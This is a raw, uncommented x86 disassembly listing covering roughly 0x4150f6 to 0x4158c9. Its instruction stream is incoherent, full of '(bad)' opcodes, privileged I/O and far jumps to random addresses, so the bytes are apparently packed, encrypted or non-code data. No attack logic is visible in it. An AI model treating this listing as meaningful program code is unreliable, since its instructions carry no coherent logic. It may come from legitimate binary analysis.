  4150f6:	aaa    
  4150f7:	out    0xee,eax
  4150f9:	aaa    
  4150fa:	cdq    
  4150fb:	ficom  DWORD PTR [edi+0x3b]
  4150fe:	jno    0x415101
  415100:	js     0x415148
  415102:	mov    dl,0xd6
  415104:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415105:	(bad)  
  415106:	fistp  DWORD PTR [ecx-0x18]
  415109:	pop    ecx
  41510a:	or     eax,0xb6a423fc
  41510f:	xchg   ebp,eax
  415110:	ficomp WORD PTR ds:0x724a5cfb
  415116:	mov    ebx,0xccb5e569
  41511b:	pop    ebx
  41511c:	mov    DWORD PTR [edi+0x21f9219a],edx
  415122:	mov    ah,0xb
  415124:	loop   0x415151
  415126:	or     BYTE PTR [ebx],0x5a
  415129:	push   ebp
  41512a:	rcr    DWORD PTR [edx+0x4892ef21],0xf0
  415131:	arpl   bp,si
  415133:	xlat   BYTE PTR ds:[ebx]
  415134:	add    ecx,0x2
  415137:	iret   
  415138:	ret    0x97ef
  41513b:	fmul   DWORD PTR [edi+0x11]
  41513e:	mov    al,ds:0x891b2595
  415143:	adc    eax,0x95837c24
  415148:	jne    0x4151c6
  41514a:	jmp    0x920996aa
  41514f:	inc    ebx
  415150:	and    DWORD PTR [ebp-0x42],ecx
  415153:	mov    ds,WORD PTR [edx+0x5f43850c]
  415159:	scas   eax,DWORD PTR es:[edi]
  41515a:	js     0x4150f3
  41515c:	jmp    0x1878d882
  415161:	cs sbb ebp,ebp
  415164:	call   0x307b:0x140e53c4
  41516b:	(bad)  
  41516c:	push   ds
  41516d:	test   eax,0x3e360a47
  415172:	cmc    
  415173:	in     eax,dx
  415174:	outs   dx,BYTE PTR ds:[esi]
  415175:	arpl   di,cx
  415177:	push   ds
  415178:	adc    al,0x8
  41517a:	sbb    ah,BYTE PTR [edx-0x221cfeaf]
  415180:	loope  0x415112
  415182:	int    0x52
  415184:	ffree  st(4)
  415186:	daa    
  415187:	pop    ebx
  415188:	jp     0x415162
  41518a:	jg     0x4151ee
  41518c:	inc    edx
  41518d:	sar    BYTE PTR [edx+0x5a],cl
  415190:	and    bh,dh
  415192:	scas   al,BYTE PTR es:[edi]
  415193:	push   esi
  415194:	pusha  
  415195:	cmp    eax,0xa470620f
  41519a:	mov    eax,ds:0x6808f94b
  41519f:	shl    DWORD PTR gs:[ecx-0x7ca1a1eb],cl
  4151a6:	sti    
  4151a7:	ret    
  4151a8:	or     cl,0xc7
  4151ab:	stos   DWORD PTR es:[edi],eax
  4151ac:	lea    esp,ds:0xfd532214
  4151b2:	ins    BYTE PTR es:[edi],dx
  4151b3:	(bad)  
  4151b4:	imul   DWORD PTR [edx]
  4151b6:	(bad)  
  4151b7:	daa    
  4151b8:	xchg   ebx,eax
  4151b9:	sahf   
  4151ba:	cwde   
  4151bb:	fld    DWORD PTR [eax-0x1ea4c200]
  4151c1:	int3   
  4151c2:	adc    DWORD PTR [ebx],0x1a
  4151c5:	cdq    
  4151c6:	add    DWORD PTR [ebx-0x48],0xd5fdf6d2
  4151cd:	mov    edi,0xe23a5c4c
  4151d2:	pop    ebp
  4151d3:	daa    
  4151d4:	jne    0x4151a0
  4151d6:	push   ebx
  4151d7:	dec    eax
  4151d8:	clts   
  4151da:	xchg   esp,eax
  4151db:	rol    ch,0xbf
  4151de:	jbe    0x41523b
  4151e0:	out    0xa4,eax
  4151e2:	jp     0x415166
  4151e4:	pop    ss
  4151e5:	ins    BYTE PTR es:[edi],dx
  4151e6:	or     dl,BYTE PTR [ebx-0x38c07d0c]
  4151ec:	or     ecx,DWORD PTR [eax-0x6f]
  4151ef:	sar    BYTE PTR [ebx+0x39],0x5c
  4151f3:	mov    ebx,0xa69190c
  4151f8:	and    edi,DWORD PTR ds:0x5520dc46
  4151fe:	in     al,dx
  4151ff:	mov    ebx,0x84d608aa
  415204:	ins    BYTE PTR es:[edi],dx
  415205:	or     al,0xcd
  415207:	loope  0x4151be
  415209:	add    DWORD PTR [eax-0x39c5f5a9],0xffffff97
  415210:	imul   esi,ecx,0x7a703a55
  415216:	mov    dl,0xef
  415218:	arpl   WORD PTR [edi+0x19],bp
  41521b:	cmp    ebx,esi
  41521d:	add    eax,0x5823c3cd
  415222:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415223:	push   ds
  415224:	lahf   
  415225:	sahf   
  415226:	popf   
  415227:	in     eax,0x4f
  415229:	push   eax
  41522a:	push   ebp
  41522b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41522c:	scas   al,BYTE PTR es:[edi]
  41522d:	(bad)  
  41522e:	hlt    
  41522f:	add    DWORD PTR [eax+0x770c82f8],eax
  415235:	fcomi  st,st(6)
  415237:	pop    esp
  415238:	in     eax,dx
  415239:	popa   
  41523a:	mov    dh,0x7
  41523c:	pop    ss
  41523d:	pop    ds
  41523e:	jge    0x415294
  415240:	lock inc ecx
  415242:	push   ds
  415243:	mov    dl,0x74
  415245:	xchg   DWORD PTR [esi-0x4983af4],ebp
  41524b:	mov    edx,0x641dbd2e
  415250:	scas   al,BYTE PTR es:[edi]
  415251:	push   edx
  415252:	push   es
  415253:	jmp    0x3108:0xdd54c170
  41525a:	xchg   BYTE PTR [edi],dl
  41525c:	dec    ebx
  41525d:	ja     0x415256
  41525f:	in     eax,dx
  415260:	fidiv  DWORD PTR [ebx+0x6e]
  415263:	xchg   edx,eax
  415264:	xchg   ebp,eax
  415265:	popf   
  415266:	mov    eax,ds:0x9c4fd641
  41526b:	sub    ebx,DWORD PTR [ebx+0x2f7d939d]
  415271:	push   esi
  415272:	scas   al,BYTE PTR es:[edi]
  415273:	pop    es
  415274:	ret    0x5e67
  415277:	push   ebx
  415278:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415279:	idiv   BYTE PTR [esi+0x19e7af16]
  41527f:	pop    ss
  415280:	lds    esp,FWORD PTR [esi+eax*1]
  415283:	fisub  WORD PTR [esi]
  415285:	loope  0x415212
  415287:	lock pushf 
  415289:	clc    
  41528a:	fdiv   st,st(4)
  41528c:	jmp    0x4152f7
  41528e:	retf   
  41528f:	dec    ecx
  415290:	pop    edx
  415291:	loopne 0x4152d0
  415293:	mov    ah,bl
  415295:	jne    0x415298
  415297:	pop    esi
  415298:	sbb    dl,dl
  41529a:	add    al,0x98
  41529c:	jb     0x415282
  41529e:	xchg   ebp,edx
  4152a0:	(bad)  
  4152a1:	icebp  
  4152a2:	cs aaa 
  4152a4:	test   al,ah
  4152a6:	jmp    0x23b08880
  4152ab:	mov    edx,0x531c4266
  4152b0:	and    ebx,edi
  4152b2:	or     ah,dl
  4152b4:	push   ebp
  4152b5:	leave  
  4152b6:	arpl   WORD PTR [ebp-0x552ee7b],di
  4152bc:	dec    esp
  4152bd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4152be:	cmp    al,0xd5
  4152c0:	add    edi,DWORD PTR [ecx-0x4e87d49e]
  4152c6:	xor    eax,0x3642c505
  4152cb:	pop    esi
  4152cc:	into   
  4152cd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4152ce:	int3   
  4152cf:	je     0x415282
  4152d1:	stc    
  4152d2:	ins    DWORD PTR es:[edi],dx
  4152d3:	add    al,0x30
  4152d5:	adc    BYTE PTR [edi+eiz*1+0x5ab809],cl
  4152dc:	rcr    DWORD PTR [edi-0x28f5713a],cl
  4152e2:	or     cl,al
  4152e4:	jg     0x4152ac
  4152e6:	push   es
  4152e7:	push   edx
  4152e8:	pop    ebx
  4152e9:	rcr    BYTE PTR [eax+eiz*1-0x51],1
  4152ed:	loop   0x415352
  4152ef:	inc    eax
  4152f0:	or     BYTE PTR [edi+0x36],0xba
  4152f4:	rol    BYTE PTR [esi],1
  4152f6:	cld    
  4152f7:	push   edx
  4152f8:	loop   0x41533d
  4152fa:	jno    0x4152c5
  4152fc:	xor    BYTE PTR [edi],0x53
  4152ff:	scas   eax,DWORD PTR es:[edi]
  415300:	push   eax
  415301:	push   0x2b
  415303:	pop    esp
  415304:	mov    WORD PTR ds:[eax+0x3c],?
  415308:	dec    edi
  415309:	rcr    BYTE PTR [ecx],cl
  41530b:	pusha  
  41530c:	jb     0x415335
  41530e:	shl    BYTE PTR [eax+ebp*1],0xcf
  415312:	mov    ch,0xb6
  415314:	push   0xc351acb6
  415319:	and    BYTE PTR [esi-0x69ed4a26],0x3
  415320:	jnp    0x41535e
  415322:	stos   DWORD PTR es:[edi],eax
  415323:	in     eax,dx
  415324:	loop   0x41537c
  415326:	iret   
  415327:	in     eax,0xd1
  415329:	stc    
  41532a:	shl    BYTE PTR [edi],1
  41532c:	dec    esi
  41532e:	adc    BYTE PTR [edx],dl
  415330:	push   ds
  415331:	stos   DWORD PTR es:[edi],eax
  415332:	popa   
  415333:	push   cs
  415334:	xchg   edx,eax
  415335:	push   0x81346246
  41533a:	call   0x49cc12e9
  41533f:	and    dh,BYTE PTR [ecx+0x3c]
  415342:	add    eax,0x2a80102f
  415347:	(bad)  
  415348:	add    al,0x6d
  41534a:	cmp    al,0xa0
  41534c:	fs push eax
  41534e:	and    bl,BYTE PTR [esi]
  415350:	xor    al,BYTE PTR [eax-0x5ab8bd36]
  415356:	lods   al,BYTE PTR ds:[esi]
  415357:	push   esp
  415358:	push   0x4e
  41535a:	aas    
  41535b:	jne    0x4153c9
  41535d:	dec    edi
  41535e:	leave  
  41535f:	xchg   ecx,eax
  415360:	push   0x16
  415362:	in     al,0x2a
  415364:	mov    dh,0x94
  415366:	add    al,0x87
  415368:	xchg   DWORD PTR [edx+0x4975b210],edi
  41536e:	call   DWORD PTR [eax-0x66]
  415371:	ret    0xafb1
  415374:	jb     0x4153af
  415376:	xchg   esp,eax
  415377:	xchg   edx,eax
  415379:	sbb    dh,BYTE PTR [eax-0x43]
  41537c:	stos   DWORD PTR es:[edi],eax
  41537d:	fcomp  DWORD PTR [ebp-0x3a]
  415380:	in     al,0x13
  415382:	(bad)  [edx]
  415384:	cli    
  415385:	fisttp DWORD PTR [esi+edx*1-0x55]
  415389:	(bad)  
  41538a:	out    dx,al
  41538b:	sub    DWORD PTR [esi+0x7f],ebp
  41538e:	repnz inc edx
  415390:	mov    esp,0x744af06b
  415395:	rcl    BYTE PTR [edx+0x7acb4e53],0x46
  41539c:	push   ebx
  41539d:	out    0x59,eax
  41539f:	or     eax,0xfde6e2fb
  4153a4:	mov    dl,0xf0
  4153a6:	push   edx
  4153a7:	cdq    
  4153a8:	add    BYTE PTR [edi-0x67de106d],0xd1
  4153af:	mov    dl,0x84
  4153b1:	adc    al,0x14
  4153b3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4153b4:	ror    bl,cl
  4153b6:	mov    bh,bl
  4153b8:	adc    al,0x9f
  4153ba:	mov    ebx,0xee63deb3
  4153bf:	test   BYTE PTR [edi-0x3a7b720],cl
  4153c5:	push   eax
  4153c6:	pop    ecx
  4153c7:	fptan  
  4153c9:	jne    0x4153ee
  4153cb:	in     eax,0xb
  4153cd:	mov    ebx,0x1e3495b1
  4153d2:	jmp    0x4153e7
  4153d4:	jmp    0x88c5a82b
  4153d9:	test   eax,0x496bd7a9
  4153de:	retf   0xe55
  4153e1:	push   edi
  4153e2:	or     edx,DWORD PTR [edx+0x44ccd830]
  4153e8:	dec    edx
  4153e9:	push   eax
  4153ea:	adc    al,0x27
  4153ec:	push   edi
  4153ed:	xlat   BYTE PTR ds:[ebx]
  4153ee:	sbb    ebx,DWORD PTR [edi-0x3f]
  4153f1:	inc    eax
  4153f2:	aam    0xf8
  4153f4:	mov    BYTE PTR [edi-0x13],ch
  4153f7:	aas    
  4153f8:	jmp    0x4e1a:0xe0a88690
  4153ff:	shr    DWORD PTR [eax+0x7f1813ab],cl
  415405:	pusha  
  415406:	xchg   BYTE PTR [eax],ch
  415408:	das    
  415409:	push   edx
  41540a:	imul   edx,DWORD PTR [edx-0x436c2ee8],0x9193d0e6
  415414:	nop
  415415:	push   es
  415416:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415417:	inc    esp
  415418:	shl    BYTE PTR [eax],cl
  41541a:	adc    DWORD PTR [edi],edi
  41541c:	push   eax
  41541d:	xchg   edi,eax
  41541e:	pop    ecx
  41541f:	adc    bh,BYTE PTR [edx]
  415421:	mov    DWORD PTR [ebx],esi
  415423:	ret    0xbfbc
  415426:	cmp    BYTE PTR [eax+eax*2-0x1],0xd4
  41542b:	mov    ebp,ebp
  41542d:	lock pop DWORD PTR [eax]
  415430:	jb     0x41544f
  415432:	mov    DWORD PTR [edi-0x21],esp
  415435:	imul   BYTE PTR [esp+ecx*8-0x6114edb8]
  41543c:	jge    0x4154ad
  41543e:	mov    eax,0x291fdca1
  415443:	cs dec esp
  415445:	or     ch,BYTE PTR [eax+0x1ede79e1]
  41544b:	jmp    0xd5f9:0x3a49b8f9
  415452:	push   esi
  415453:	jmp    0x128a5161
  415458:	in     al,0x18
  41545a:	dec    esp
  41545b:	adc    edi,ecx
  41545d:	ret    0xfbda
  415460:	into   
  415461:	xchg   edi,eax
  415462:	cmp    eax,0xdc54950a
  415467:	or     eax,0x40fe3e84
  41546c:	loopne 0x41540d
  41546e:	cwde   
  41546f:	push   0xa9d5836f
  415474:	adc    ebp,DWORD PTR [ebx]
  415476:	jno    0x41545d
  415478:	jp     0x4154e5
  41547a:	mov    dh,0xaf
  41547c:	out    0x83,eax
  41547e:	push   0x78
  415480:	sbb    edx,DWORD PTR [edx]
  415482:	(bad)  
  415483:	and    al,0xf
  415485:	fs int3 
  415487:	mov    al,0x23
  415489:	pushf  
  41548a:	xor    DWORD PTR [edx],eax
  41548c:	fwait
  41548d:	push   ds
  41548e:	leave  
  41548f:	loopne 0x415504
  415491:	mov    ds:0x8fdfbb87,al
  415496:	add    eax,0x82c3d32
  41549b:	push   ecx
  41549c:	pop    ebx
  41549d:	and    eax,0xbd6007d9
  4154a2:	sahf   
  4154a3:	leave  
  4154a4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4154a5:	xchg   BYTE PTR [edx],dh
  4154a7:	push   eax
  4154a8:	pop    edx
  4154a9:	push   esp
  4154aa:	add    al,0xfc
  4154ac:	cmp    BYTE PTR [ebp+0x2a472b08],ah
  4154b2:	pop    ebp
  4154b3:	imul   ecx,edi,0x57
  4154b6:	or     ecx,edi
  4154b8:	out    0x1e,eax
  4154ba:	daa    
  4154bb:	sbb    eax,esi
  4154bd:	add    eax,0x5f8e213c
  4154c2:	shl    cl,cl
  4154c4:	push   ds
  4154c5:	xor    dl,dh
  4154c7:	push   0xb34d5ea8
  4154cc:	clc    
  4154cd:	repnz cmp eax,0xf1ef4cd3
  4154d3:	imul   ebx,DWORD PTR [ebx+0x39],0xea12a7e6
  4154da:	pop    ebx
  4154db:	mov    cs,edi
  4154dd:	xor    eax,0xda3238b8
  4154e2:	jmp    DWORD PTR [eax+0x1b]
  4154e5:	pop    edi
  4154e6:	inc    esp
  4154e7:	mov    bl,0xae
  4154e9:	nop
  4154ea:	loope  0x4154e7
  4154ec:	daa    
  4154ed:	daa    
  4154ee:	outs   dx,BYTE PTR ds:[esi]
  4154ef:	fs inc eax
  4154f1:	ret    
  4154f2:	mov    DWORD PTR [ecx+0x702fdcbf],eax
  4154f8:	cs and al,0xab
  4154fb:	jmp    0x415541
  4154fd:	test   BYTE PTR [esp+ebx*2-0x5c4b1fde],al
  415504:	sbb    edx,DWORD PTR [edx+0x66]
  415507:	js     0x415549
  415509:	mov    bh,dh
  41550b:	lea    ebp,[ebx+0x8]
  41550e:	jmp    0x41549c
  415510:	out    0x22,al
  415512:	std    
  415513:	daa    
  415514:	mov    ss:0x2ccc4b57,al
  41551a:	sub    BYTE PTR [eax-0x5bd7bee5],bh
  415520:	mov    al,ds:0x142c3db5
  415525:	mov    ds:0xf7351b9d,al
  41552a:	sbb    eax,0x5c76235a
  41552f:	cli    
  415530:	(bad)  
  415531:	in     eax,dx
  415532:	aaa    
  415533:	data16 mov bl,0xf9
  415536:	pop    es
  415537:	mov    dl,dl
  415539:	cdq    
  41553a:	std    
  41553b:	enter  0xcb8a,0x11
  41553f:	retf   0xdbca
  415542:	stos   BYTE PTR es:[edi],al
  415543:	fld    TBYTE PTR [edx]
  415545:	xchg   ecx,eax
  415546:	(bad)  
  415547:	call   0xc9126268
  41554c:	jge    0x415566
  41554e:	in     eax,0x5b
  415550:	pop    ds
  415551:	pusha  
  415552:	jne    0x41551b
  415554:	retf   
  415555:	pop    ebp
  415556:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415557:	sbb    eax,0x14852815
  41555c:	adc    al,0xd9
  41555e:	dec    BYTE PTR [edi-0x7beaa7b8]
  415564:	sbb    al,0x3a
  415566:	xchg   DWORD PTR [esp+esi*8],ecx
  415569:	pop    ecx
  41556a:	adc    al,0x4f
  41556c:	inc    edi
  41556d:	push   esp
  41556e:	add    eax,0x8cc34b1f
  415573:	in     al,0x73
  415575:	dec    eax
  415576:	rcr    BYTE PTR ds:0xae8d48a7,0x48
  41557d:	rcr    DWORD PTR [esi],cl
  41557f:	push   esp
  415580:	push   eax
  415581:	shl    DWORD PTR [esi-0x5317b55d],1
  415587:	mov    esp,0xe13172a9
  41558c:	sub    bh,BYTE PTR [esi]
  41558e:	sbb    eax,0x973e5f8a
  415593:	jne    0x4155bb
  415595:	aam    0x26
  415597:	and    BYTE PTR [ecx+0x47b168c6],dh
  41559d:	and    BYTE PTR [edx+0x7769ef03],al
  4155a3:	in     al,0x17
  4155a5:	mov    BYTE PTR [edx+eiz*4+0x64],dh
  4155a9:	rcr    edx,0x2
  4155ac:	mov    ds:0x5b18e56,eax
  4155b1:	dec    ebx
  4155b2:	and    DWORD PTR [edi],esp
  4155b4:	inc    edi
  4155b5:	jle    0x41556c
  4155b7:	xchg   ebx,eax
  4155b8:	cmp    DWORD PTR [ebp-0x36596aa0],edi
  4155be:	cmp    al,0x84
  4155c0:	jmp    0x2a0ad6c2
  4155c5:	jl     0x4155de
  4155c7:	repz jmp 0xde2d:0x8b3be133
  4155cf:	test   BYTE PTR gs:[ebp-0x3b],al
  4155d3:	cmp    eax,0x957fb625
  4155d8:	mov    eax,0xb81d47e9
  4155dd:	stc    
  4155de:	inc    eax
  4155df:	dec    esp
  4155e0:	mov    dh,0x41
  4155e2:	sub    dh,BYTE PTR [eax+0x4d]
  4155e5:	xchg   ebx,eax
  4155e6:	and    DWORD PTR [ecx-0x3e],eax
  4155e9:	pushf  
  4155ea:	stos   BYTE PTR es:[edi],al
  4155eb:	imul   esp,DWORD PTR [ecx],0x3
  4155ee:	sbb    bh,BYTE PTR [esi-0x3e]
  4155f1:	(bad)  
  4155f2:	cmp    eax,0xb2cd55ca
  4155f7:	dec    ebp
  4155f8:	out    0x68,al
  4155fa:	jl     0x4155ca
  4155fc:	fmul   DWORD PTR [ecx]
  4155fe:	cmp    bh,BYTE PTR [esp+edx*8]
  415601:	jbe    0x4155d6
  415603:	loop   0x415604
  415605:	mov    edi,0xd6ace31f
  41560a:	lods   eax,DWORD PTR ds:[esi]
  41560b:	add    BYTE PTR [edi+0x4b],al
  41560e:	(bad)  
  41560f:	nop
  415610:	lods   ax,WORD PTR ds:[esi]
  415612:	sub    al,0xfe
  415614:	(bad)  
  415615:	mov    es,WORD PTR [eax-0x4ea167d1]
  41561b:	sub    DWORD PTR [edx],esp
  41561d:	(bad)
  415620:	clc    
  415621:	(bad)  
  415623:	ins    BYTE PTR es:[edi],dx
  415624:	push   ebx
  415625:	and    eax,0xfa71dfa8
  41562a:	lods   al,BYTE PTR ds:[esi]
  41562b:	sahf   
  41562c:	mov    edi,DWORD PTR [edi+0x45]
  41562f:	jmp    DWORD PTR [edx+0x69]
  415632:	hlt    
  415633:	push   ebx
  415634:	jns    0x415621
  415636:	mov    ch,bl
  415638:	push   ebx
  415639:	push   ds
  41563a:	mov    dh,0x1c
  41563c:	add    BYTE PTR [ebx],cl
  41563e:	mov    dl,0x99
  415640:	in     eax,0x88
  415642:	dec    ebx
  415643:	in     eax,0x3d
  415645:	push   eax
  415646:	sbb    al,0x38
  415648:	fs std 
  41564a:	push   es
  41564b:	outs   dx,DWORD PTR ds:[esi]
  41564c:	jae    0x415682
  41564e:	push   cs
  41564f:	mov    ds:0x35f72255,eax
  415654:	push   0x5281d70f
  415659:	jo     0x415658
  41565b:	add    al,0x86
  41565d:	or     al,0x23
  41565f:	push   0x5f4e157a
  415664:	cmp    BYTE PTR [edi+0x459d6804],cl
  41566a:	retf   
  41566b:	in     al,dx
  41566c:	aas    
  41566d:	mov    ch,0xe2
  41566f:	aas    
  415670:	mov    ds:0x8862966e,eax
  415675:	mov    BYTE PTR [edi+0x6ef35e54],cl
  41567b:	lods   eax,DWORD PTR ds:[esi]
  41567c:	jae    0x4156cc
  41567e:	adc    al,0x8c
  415680:	repz adc DWORD PTR [ebp+esi*8+0x18],edx
  415685:	sbb    BYTE PTR [eax],dh
  415687:	inc    ebx
  415688:	stos   DWORD PTR es:[edi],eax
  415689:	nop
  41568a:	xchg   ebx,eax
  41568b:	mov    cs,WORD PTR ds:0x32fb2579
  415691:	mov    WORD PTR [ebx+0x1a],gs
  415694:	aam    0x60
  415696:	xchg   edi,eax
  415697:	adc    bl,BYTE PTR [ebp+0x52]
  41569a:	dec    edi
  41569b:	mov    al,bh
  41569d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41569e:	lods   al,BYTE PTR ds:[esi]
  41569f:	enter  0x4dd9,0x5c
  4156a3:	mov    ebp,0x8f7486f1
  4156a8:	and    DWORD PTR [edi+0x71],edx
  4156ab:	dec    esi
  4156ac:	dec    eax
  4156ad:	mov    esp,0xae4f6252
  4156b2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4156b3:	mov    ebx,0xf7f45204
  4156b8:	lea    edi,[esi+0x41]
  4156bb:	pop    esp
  4156bc:	mov    esp,eax
  4156be:	cmp    edx,DWORD PTR [ebp+0xc]
  4156c1:	shr    DWORD PTR [edx+ebp*1-0x3c1d297b],cl
  4156c8:	into   
  4156c9:	mov    eax,0xae8accc
  4156ce:	lahf   
  4156cf:	and    BYTE PTR [ebp+0x40],al
  4156d2:	fs sbb al,0x96
  4156d5:	add    esp,ebx
  4156d7:	jmp    0x9e35ceda
  4156dc:	jnp    0x4156d8
  4156de:	ret    0xc54b
  4156e1:	stos   BYTE PTR es:[edi],al
  4156e2:	jnp    0x4156d6
  4156e4:	sbb    edi,eax
  4156e6:	sar    BYTE PTR [edx+esi*1+0x1155becf],cl
  4156ed:	push   edx
  4156ee:	fcomp  QWORD PTR [ebx]
  4156f0:	cmp    edx,ebp
  4156f2:	or     dh,BYTE PTR [edx+0x2]
  4156f5:	dec    ecx
  4156f7:	into   
  4156f8:	inc    ecx
  4156f9:	push   es
  4156fa:	xchg   edx,eax
  4156fb:	jae    0x4156da
  4156fd:	outs   dx,BYTE PTR ds:[esi]
  4156fe:	ins    BYTE PTR es:[edi],dx
  4156ff:	cdq    
  415700:	pop    esi
  415701:	out    0xea,eax
  415703:	lahf   
  415704:	jo     0x4156c0
  415706:	mov    ecx,0x598c5595
  41570b:	add    eax,0xb0a434d2
  415710:	fs jl  0x415719
  415713:	sub    eax,0xe147e99d
  415718:	arpl   WORD PTR [esi-0x4f],bx
  41571b:	mov    esp,esi
  41571d:	rcl    DWORD PTR [ebx-0x24],1
  415720:	mov    dh,0x1
  415722:	and    eax,0x7a94ae20
  415727:	or     esp,0x6d
  41572a:	pop    ds
  41572b:	sub    DWORD PTR [esp+ecx*2+0x7d4af833],0xffffff92
  415733:	or     esi,DWORD PTR [esi-0x208fc8b6]
  415739:	mov    cl,0xfd
  41573b:	sub    ah,ah
  41573d:	dec    ebx
  41573e:	daa    
  41573f:	(bad)  
  415740:	cli    
  415741:	scas   al,BYTE PTR es:[edi]
  415742:	mov    eax,ds:0x622a6fba
  415747:	pop    ecx
  415748:	push   ds
  415749:	gs sub eax,0x81916680
  41574f:	or     eax,0xe1392046
  415754:	jns    0x4156ec
  415756:	loope  0x4157cb
  415758:	lods   eax,DWORD PTR ds:[esi]
  415759:	loopne 0x4157bb
  41575b:	int    0x42
  41575d:	repnz cmp DWORD PTR ds:0x9d73b70a,esi
  415764:	add    al,0xd4
  415766:	es idiv bh
  415769:	out    0x1c,eax
  41576b:	mov    esp,edx
  41576d:	mov    bh,0x59
  41576f:	int3   
  415770:	in     ax,0xfd
  415773:	(bad)  
  415774:	loopne 0x415752
  415776:	cmp    DWORD PTR cs:[edx+eax*2],esp
  41577a:	dec    eax
  41577b:	jno    0x415748
  41577d:	std    
  41577e:	jo     0x41577d
  415780:	inc    esi
  415781:	lock retf 0x6448
  415785:	sub    BYTE PTR [eax+0x36f966f2],0x7a
  41578c:	(bad)  
  41578d:	jmp    0x415765
  41578f:	cmp    DWORD PTR [ecx-0x74a5057d],ebp
  415795:	test   BYTE PTR [ebx+0x1],ah
  415798:	jl     0x41571c
  41579a:	sbb    al,0xc4
  41579c:	or     cl,ch
  41579e:	enter  0xfaab,0xe
  4157a2:	mov    eax,ds:0xefcd067d
  4157a7:	mov    dh,0xa7
  4157a9:	push   edx
  4157aa:	out    dx,al
  4157ab:	xchg   ebp,eax
  4157ac:	repz push eax
  4157ae:	xlat   BYTE PTR ds:[ebx]
  4157af:	jg     0x4157de
  4157b1:	stos   DWORD PTR es:[edi],eax
  4157b2:	sub    DWORD PTR [eax],eax
  4157b4:	add    BYTE PTR [eax],bl
  4157b6:	iret   
  4157b7:	pop    ebp
  4157b8:	mov    esp,0x733c5b94
  4157bd:	fiadd  WORD PTR [esi-0x3abd3080]
  4157c3:	(bad)  
  4157c4:	or     eax,0xeb56dfa0
  4157c9:	add    BYTE PTR [ebp+0x68],dl
  4157cc:	loope  0x415791
  4157ce:	stos   BYTE PTR es:[edi],al
  4157cf:	push   edx
  4157d0:	rol    ebp,cl
  4157d2:	out    0xa5,eax
  4157d4:	dec    ecx
  4157d5:	inc    esi
  4157d6:	imul   ebp,DWORD PTR [edx-0x482dd9ea],0x6b388b85
  4157e0:	xor    DWORD PTR [ebx+esi*4+0x48],edi
  4157e4:	ja     0x415815
  4157e6:	lock or DWORD PTR [esi+0x25],edi
  4157ea:	cmp    ebp,DWORD PTR [edx-0x65954507]
  4157f0:	fmul   st(6),st
  4157f2:	mov    es,WORD PTR gs:[edi]
  4157f5:	mov    cl,0x36
  4157f7:	dec    esi
  4157f8:	int    0x1
  4157fa:	(bad)  
  4157fb:	sub    al,0xae
  4157fd:	push   esi
  4157fe:	stos   BYTE PTR es:[edi],al
  4157ff:	ret    0x5388
  415802:	imul   ecx,ebx,0x67
  415805:	inc    eax
  415806:	or     DWORD PTR [esi+edi*1],esp
  415809:	inc    edi
  41580a:	adc    cl,BYTE PTR [esi+ecx*8-0x2a0644f9]
  415811:	and    dl,BYTE PTR [ebx-0x7fc8340b]
  415817:	imul   eax,DWORD PTR [edx-0x79],0x23437087
  41581e:	ins    DWORD PTR es:[edi],dx
  41581f:	(bad)  
  415820:	fidivr WORD PTR [ebx+edx*8-0x1c]
  415824:	(bad)  
  415825:	fcmovbe st,st(5)
  415827:	xchg   bh,ch
  415829:	icebp  
  41582a:	inc    ecx
  41582b:	outs   dx,BYTE PTR ds:[esi]
  41582c:	in     eax,0xa0
  41582e:	xor    ecx,ecx
  415830:	in     al,0xd9
  415832:	jnp    0x415831
  415834:	push   esp
  415835:	adc    eax,0xfa298178
  41583a:	push   cs
  41583b:	mov    ch,0xeb
  41583d:	pop    ss
  41583e:	sete   BYTE PTR [edx+0x24]
  415842:	cmc    
  415843:	push   ebx
  415844:	push   esi
  415845:	stos   DWORD PTR es:[edi],eax
  415846:	inc    esi
  415847:	shl    DWORD PTR [ebx+ebx*8],0xa6
  41584b:	or     ch,dh
  41584d:	pop    ebp
  41584e:	fstp   st(2)
  415850:	out    0x1c,al
  415852:	cdq    
  415853:	inc    ebx
  415854:	inc    ebx
  415855:	fld    DWORD PTR es:[eax]
  415858:	or     eax,0xed06a712
  41585d:	cmovno edx,DWORD PTR ss:[esi]
  415861:	neg    ch
  415863:	inc    ebp
  415864:	call   0xa8c3b142
  415869:	stos   BYTE PTR es:[edi],al
  41586a:	mov    edi,0x8575846
  41586f:	jg     0x415894
  415871:	xchg   ecx,eax
  415872:	jno    0x415866
  415874:	xchg   ebp,eax
  415875:	dec    ecx
  415876:	hlt    
  415877:	out    dx,al
  415878:	cmp    DWORD PTR [eax],eax
  41587a:	dec    esp
  41587b:	xchg   esi,eax
  41587c:	adc    esp,esi
  41587e:	aam    0x88
  415880:	sub    al,0xcb
  415882:	test   eax,0x8c37a4d5
  415887:	outs   dx,BYTE PTR ds:[esi]
  415888:	dec    esi
  415889:	jno    0x415816
  41588b:	jb     0x415883
  41588d:	into   
  41588e:	cwde   
  41588f:	rcl    DWORD PTR ds:0x1f9e47dd,1
  415895:	into   
  415896:	daa    
  415897:	adc    DWORD PTR [eax],esp
  415899:	fsubr  QWORD PTR [esi]
  41589b:	mov    gs,WORD PTR [edi-0xa]
  41589e:	cmp    al,0x71
  4158a0:	or     cl,BYTE PTR [edi]
  4158a2:	loope  0x4158a5
  4158a4:	mov    al,ds:0xca49d1cf
  4158a9:	inc    ebp
  4158aa:	push   edx
  4158ab:	nop
  4158ac:	jbe    0x415872
  4158ae:	fs xor eax,ebx
  4158b1:	neg    BYTE PTR [edi+0x26e219d2]
  4158b7:	scas   al,BYTE PTR es:[edi]
  4158b8:	and    BYTE PTR [edi+0x5a5d0b40],ah
  4158be:	or     al,0x8f
  4158c0:	dec    ebx
  4158c1:	mov    bl,0xfc
  4158c3:	mov    ebp,0x312a684e
  4158c8:	retf   
  4158c9:	and    eax,0xfeb73b3
